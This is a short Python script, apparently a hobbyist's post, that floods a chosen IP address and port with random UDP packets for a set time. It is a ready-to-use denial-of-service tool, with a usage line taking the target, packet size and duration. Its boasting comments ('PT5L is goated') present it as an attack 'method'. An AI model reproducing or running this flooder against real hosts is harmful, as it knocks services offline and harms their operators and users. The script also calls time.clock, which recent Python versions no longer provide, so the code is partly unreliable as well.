#!/usr/bin/python
#pt5l bak here this my first python method i made, so gg love yall:heart:
 
import socket, random, sys, time, os, platform, base64
 
 
if len(sys.argv) != 5:
        print("\nUsage: %s <IP> <PORT> <psize)> <Time>\n" % sys.argv[0])
        sys.exit(1)
 
qIP = sys.argv[1]
qPort = int(sys.argv[2])
qPSize = int(sys.argv[3])
qDuration = int(sys.argv[4])
 
qClock = (lambda:0, time.clock)[qDuration > 0]
 
 
qDuration = (1, (qClock() + qDuration))[qDuration > 0]
 
qPacket = random._urandom(qPSize)
qSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
print("[UDP Flood starting on %s with %s bytes for %s seconds]" % (qIP, qPSize, qDuration or 'Infinite'))
 
while True:
        if (qClock() < qDuration):
                qSocket.sendto(qPacket, (qIP, qPort))
        else:
                break
 
print("My 3rd method, PT5L is goated...")